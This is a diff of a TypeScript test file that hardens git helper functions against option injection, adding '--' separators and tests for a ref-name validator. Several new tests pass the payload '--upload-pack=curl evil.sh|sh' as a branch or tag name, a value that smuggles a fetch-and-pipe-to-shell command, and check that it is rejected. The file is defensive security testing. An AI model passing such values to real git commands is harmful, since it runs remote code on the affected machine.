@@ -6,8 +6,14 @@ vi.mock("node:child_process", () => ({
   spawnSync: (...args: unknown[]) => spawnSyncMock(...args),
 }));
 
-const { git, readFileAtTag, remoteBranchExists, requireOk, tagExists } =
-  await import("./git");
+const {
+  assertSafeRefName,
+  git,
+  readFileAtTag,
+  remoteBranchExists,
+  requireOk,
+  tagExists,
+} = await import("./git");
 
 describe("git", () => {
   beforeEach(() => {
@@ -64,6 +70,7 @@ describe("remoteBranchExists", () => {
         "--exit-code",
         "--heads",
         "origin",
+        "--",
         "sdk/svc-auth/ts-client",
       ],
       { cwd: "/repo", encoding: "utf8" },
@@ -74,6 +81,13 @@ describe("remoteBranchExists", () => {
     spawnSyncMock.mockReturnValue({ status: 2, stdout: "", stderr: "" });
 
     expect(remoteBranchExists("/repo", "missing-branch")).toBe(false);
+  });
+
+  it("rejects a branch starting with '-' instead of passing it to git", () => {
+    expect(() =>
+      remoteBranchExists("/repo", "--upload-pack=curl evil.sh|sh"),
+    ).toThrow(/Invalid git branch/);
+    expect(spawnSyncMock).not.toHaveBeenCalled();
   });
 });
 
@@ -93,6 +107,7 @@ describe("tagExists", () => {
         "--exit-code",
         "--tags",
         "origin",
+        "--",
         "svc-auth-ts-client-v1.0.0",
       ],
       { cwd: "/repo", encoding: "utf8" },
@@ -103,6 +118,13 @@ describe("tagExists", () => {
     spawnSyncMock.mockReturnValue({ status: 2, stdout: "", stderr: "" });
 
     expect(tagExists("/repo", "missing-tag")).toBe(false);
+  });
+
+  it("rejects a tag starting with '-' instead of passing it to git", () => {
+    expect(() => tagExists("/repo", "--upload-pack=curl evil.sh|sh")).toThrow(
+      /Invalid git tag/,
+    );
+    expect(spawnSyncMock).not.toHaveBeenCalled();
   });
 });
 
@@ -122,7 +144,7 @@ describe("readFileAtTag", () => {
     expect(spawnSyncMock).toHaveBeenNthCalledWith(
       1,
       "git",
-      ["fetch", "origin", "refs/tags/v1.0.0:refs/tags/v1.0.0", "--force"],
+      ["fetch", "origin", "--force", "--", "refs/tags/v1.0.0:refs/tags/v1.0.0"],
       { cwd: "/repo", encoding: "utf8" },
     );
     expect(spawnSyncMock).toHaveBeenNthCalledWith(
@@ -140,6 +162,20 @@ describe("readFileAtTag", () => {
     expect(spawnSyncMock).toHaveBeenCalledTimes(1);
   });
 
+  it("rejects a tag starting with '-' instead of passing it to git", () => {
+    expect(() =>
+      readFileAtTag("/repo", "--upload-pack=curl evil.sh|sh", "SPEC_HASH"),
+    ).toThrow(/Invalid git tag/);
+    expect(spawnSyncMock).not.toHaveBeenCalled();
+  });
+
+  it("rejects an empty file path instead of passing it to git", () => {
+    expect(() => readFileAtTag("/repo", "v1.0.0", "")).toThrow(
+      /Invalid git file path/,
+    );
+    expect(spawnSyncMock).not.toHaveBeenCalled();
+  });
+
   it("returns null when the tag exists but the file doesn't (pre-dates the file's introduction)", () => {
     spawnSyncMock
       .mockReturnValueOnce({ status: 0, stdout: "", stderr: "" })
@@ -150,6 +186,24 @@ describe("readFileAtTag", () => {
       });
 
     expect(readFileAtTag("/repo", "v0.1.0", "SPEC_HASH")).toBeNull();
+  });
+});
+
+describe("assertSafeRefName", () => {
+  it("does not throw for an ordinary ref name", () => {
+    expect(() =>
+      assertSafeRefName("sdk/svc-auth/ts-client", "branch"),
+    ).not.toThrow();
+  });
+
+  it("throws for a ref name starting with '-'", () => {
+    expect(() => assertSafeRefName("-x", "branch")).toThrow(
+      'Invalid git branch "-x": must not start with "-" - git would parse it as a command-line option instead of a ref name',
+    );
+  });
+
+  it("throws for an empty ref name", () => {
+    expect(() => assertSafeRefName("", "tag")).toThrow(/Invalid git tag/);
   });
 });
 
